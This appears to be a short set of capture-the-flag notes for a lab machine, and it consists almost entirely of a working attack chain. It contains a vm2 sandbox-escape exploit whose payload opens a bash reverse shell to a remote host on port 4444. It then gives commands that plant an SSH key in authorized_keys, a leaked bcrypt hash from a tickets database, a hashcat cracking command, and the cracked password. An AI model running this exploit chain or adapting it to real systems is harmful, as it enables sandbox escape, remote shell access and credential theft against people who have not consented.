# ip
10.10.11.239

# rev shell
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync("bash -c 'sh -i >& /dev/tcp/10.10.14.37/4444 0>&1'");
}

console.log(vm.run(code));

# connection ssh
~/.ssh/
ssh-keygen -f mykey
chmod 600 mykey
echo "<mykey.pub>" >> ~/.ssh/authorized_keys
ssh -i mykey <username>@<remote_ip>

# sql info
/var/www/contact/tickets.db
joshua$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2

# hash bcrypt
$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2

# crack password hashcat
hashcat -a 0 -m 3200 hash /usr/share/wordlists/rockyou.txt
password:
spongebob1

su joshua
spongebob1